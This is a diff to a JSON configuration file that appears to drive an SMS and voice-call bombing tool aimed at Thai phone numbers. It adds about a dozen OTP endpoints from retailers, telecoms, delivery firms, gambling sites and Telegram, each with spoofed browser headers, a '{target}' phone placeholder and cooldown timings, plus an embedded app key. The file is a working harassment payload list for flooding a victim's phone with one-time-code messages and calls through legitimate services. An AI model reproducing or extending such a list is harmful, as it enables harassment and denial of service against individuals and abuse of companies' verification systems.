@@ -16,8 +16,10 @@
     },
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "OK"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "1112 Delivery OTP",
@@ -36,8 +38,10 @@
     },
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "OK"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "Wongnai OTP",
@@ -53,8 +57,10 @@
     "payload": "phoneno={target}&retrycount=0",
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "phoneNumber"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "Kex-Express Kerry OTP",
@@ -73,8 +79,10 @@
     "payload": {},
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "success"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "NocNoc Marketplace OTP",
@@ -103,8 +111,10 @@
     },
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "SUCCESS"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "Freshket Food Supply OTP",
@@ -125,8 +135,10 @@
     },
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "is_success"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "Giztix Logistics OTP",
@@ -151,8 +163,10 @@
     },
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "otpGeneratePhone"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "CH3Plus Login OTP",
@@ -173,8 +187,10 @@
     },
     "timeout": 6.0,
     "cooldown": 3.0,
-    "success_codes": [200, 201],
-    "success_keyword": "OTP is requested"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "CH3Plus Register OTP",
@@ -195,8 +211,10 @@
     },
     "timeout": 6.0,
     "cooldown": 3.0,
-    "success_codes": [200, 201],
-    "success_keyword": "OTP is requested"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "RedBus Express OTP",
@@ -211,8 +229,10 @@
     "payload": {},
     "timeout": 6.0,
     "cooldown": 2.0,
-    "success_codes": [200, 201],
-    "success_keyword": "OTP Sent Successfully"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "Telegram Voice Call",
@@ -220,7 +240,6 @@
     "country": "th",
     "method": "POST",
     "url": "https://my.telegram.org/auth/send_password",
-    "preflight_url": "https://my.telegram.org/auth",
     "headers": {
       "Content-Type": "application/x-www-form-urlencoded",
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
@@ -229,8 +248,10 @@
     "payload": "phone=+66{target_clean}",
     "timeout": 8.0,
     "cooldown": 10.0,
-    "success_codes": [200, 201],
-    "success_keyword": "random_hash"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "Telegram Security Call",
@@ -238,7 +259,6 @@
     "country": "th",
     "method": "POST",
     "url": "https://my.telegram.org/auth/send_password",
-    "preflight_url": "https://my.telegram.org/auth",
     "headers": {
       "Content-Type": "application/x-www-form-urlencoded",
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
@@ -247,8 +267,10 @@
     "payload": "phone={target_e164}",
     "timeout": 8.0,
     "cooldown": 10.0,
-    "success_codes": [200, 201],
-    "success_keyword": "random_hash"
+    "success_codes": [
+      200,
+      201
+    ]
   },
   {
     "name": "SportPlayAuto OTP",
@@ -269,7 +291,274 @@
     },
     "timeout": 6.0,
     "cooldown": 3.0,
-    "success_codes": [200, 201],
-    "success_keyword": "0"
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "Kex-Express",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/{target}",
+    "headers": {
+      "Appid": "Website_Api",
+      "Appkey": "fcdf0569-c2a1-4dee-bd22-9d5361c047f2",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Origin": "https://th.kex-express.com",
+      "Referer": "https://th.kex-express.com/"
+    },
+    "body_type": "none",
+    "payload": {},
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "Mgame666",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://gw.mgame666.com/AuthAPI/SendSms",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Accept": "application/json, text/plain, */*",
+      "Accept-Language": "th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7",
+      "Referer": "https://okmega.pgm77.com/",
+      "Origin": "https://okmega.pgm77.com",
+      "Content-Type": "application/json"
+    },
+    "body_type": "json",
+    "payload": {
+      "Phone": "{target}"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "Pigspin",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://jklmn23456.com/api/v1/user/phone/verify",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Origin": "https://pigspin.org",
+      "Referer": "https://pigspin.org/",
+      "Content-Type": "application/json"
+    },
+    "body_type": "json",
+    "payload": {
+      "phone_number": "{target}"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "ToppingTrue",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://topping.truemoveh.com/api/get_request_otp",
+    "headers": {
+      "Accept": "application/json, text/plain, */*",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Origin": "https://topping.truemoveh.com",
+      "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104"
+    },
+    "body_type": "data",
+    "payload": "mobile_number={target}",
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "Joox",
+    "type": "sms",
+    "country": "th",
+    "method": "GET",
+    "url": "https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{target_clean}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    },
+    "body_type": "none",
+    "payload": {},
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "DavyJones",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://davyjones.mrwed.cloud/customer/register/get-otp",
+    "headers": {
+      "content-type": "application/json",
+      "accept-language": "th",
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "origin": "https://member.ufa058.com",
+      "referer": "https://member.ufa058.com/"
+    },
+    "body_type": "json",
+    "payload": {
+      "countryCode": "TH",
+      "phoneNumber": "{target}"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "SaleHere",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api.salehere.co.th/graphql",
+    "headers": {
+      "content-type": "application/json",
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "origin": "https://salehere.co.th",
+      "referer": "https://salehere.co.th/"
+    },
+    "body_type": "json",
+    "payload": {
+      "operationName": "sendUserOTPV2",
+      "variables": {
+        "tel": "{target}",
+        "token": ""
+      },
+      "extensions": {
+        "persistedQuery": {
+          "version": 1,
+          "sha256Hash": "acecc9495b3613d3f076c1588fc5c2fd6fc90dad9a7eaa65f3cef86da88fe68d"
+        }
+      }
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "Firster",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://graph.firster.com/graphql",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "organizationcode": "lifestyle",
+      "content-type": "application/json"
+    },
+    "body_type": "json",
+    "payload": {
+      "operationName": "sendOtp",
+      "variables": {
+        "input": {
+          "mobileNumber": "{target_clean}",
+          "phoneCode": "THA-66"
+        }
+      },
+      "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "iShip",
+    "type": "sms",
+    "country": "th",
+    "method": "GET",
+    "url": "https://app.iship.cloud/api/ant/request-otp/{target}",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
+    },
+    "body_type": "none",
+    "payload": {},
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "MonkeyEveryday",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://api.monkeyeveryday.com/graphql",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "content-type": "application/json",
+      "origin": "https://monkeyeveryday.com",
+      "referer": "https://monkeyeveryday.com/"
+    },
+    "body_type": "json",
+    "payload": {
+      "operationName": "requestRegistrationOtp",
+      "variables": {
+        "phone": "{target}"
+      },
+      "query": "mutation requestRegistrationOtp($phone: String!) {\n  requestRegistrationOtp(phone: $phone) {\n    token\n    __typename\n  }\n}\n"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
+  },
+  {
+    "name": "BigC",
+    "type": "sms",
+    "country": "th",
+    "method": "POST",
+    "url": "https://openapi.bigc.co.th/customer/v1/otp",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+      "content-type": "application/json",
+      "origin": "https://www.bigc.co.th",
+      "referer": "https://www.bigc.co.th/"
+    },
+    "body_type": "json",
+    "payload": {
+      "phone_no": "{target}"
+    },
+    "timeout": 6.0,
+    "cooldown": 3.0,
+    "success_codes": [
+      200,
+      201
+    ]
   }
 ]
